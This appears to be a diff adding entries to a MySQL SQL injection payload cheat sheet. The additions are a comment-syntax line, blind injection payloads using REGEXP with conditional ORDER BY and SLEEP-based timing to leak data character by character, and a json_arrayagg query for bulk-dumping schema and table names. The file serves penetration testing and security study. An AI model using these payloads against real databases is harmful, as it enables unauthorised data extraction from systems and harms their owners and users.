@@ -28,6 +28,7 @@
     * [Into dumpfile method](#into-dumpfile-method)
 * [MYSQL UDF command execution](#mysql-udf-command-execution)
 * [MYSQL Truncation](#mysql-truncation)
+* [MYSQL Fast Exploitation](#mysql-fast-exploitation)
 * [MYSQL Out of band](#mysql-out-of-band)
     * [DNS exfiltration](#dns-exfiltration)
     * [UNC Path - NTLM hash stealing](#unc-path---ntlm-hash-stealing)
@@ -38,6 +39,7 @@
 
 ```sql
 # MYSQL Comment
+-- comment [Note the space after the double dash]
 /* MYSQL Comment */
 /*! MYSQL Special SQL */
 /*!32302 10*/ Comment for MYSQL version 3.23.02
@@ -232,6 +234,29 @@ Works with `MySQL >= 5.1`
 ?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
 ```
 
+### MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP
+
+This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not.
+For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.
+
+```
+[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -
+```
+
+### MySQL Blind SQL Injection binary query using REGEXP.
+
+Payload:
+```
+' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
+```
+
+Would work in the query (where the "where" clause is the injection point):
+```
+SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -';
+```
+
+In said query, it will check to see if an item exists in the "name" column in the "items" database that starts with an "a". If it will sleep for 3 seconds per item.
+
 ### MYSQL Blind using a conditional statement
 
 TRUE: `if @@version starts with a 5`:
@@ -397,6 +422,18 @@ In MYSQL "`admin `" and "`admin`" are the same. If the username column in the da
 ```
 
 Payload: `username = "admin               a"`
+
+## MYSQL Fast Exploitation
+
+Requirement: `MySQL >= 5.7.22`
+
+Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed
+* group_concat() = 1024 symbols
+* json_arrayagg() > 16,000,000 symbols
+
+```sql
+SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
+```
 
 ## MYSQL UDF command execution
 
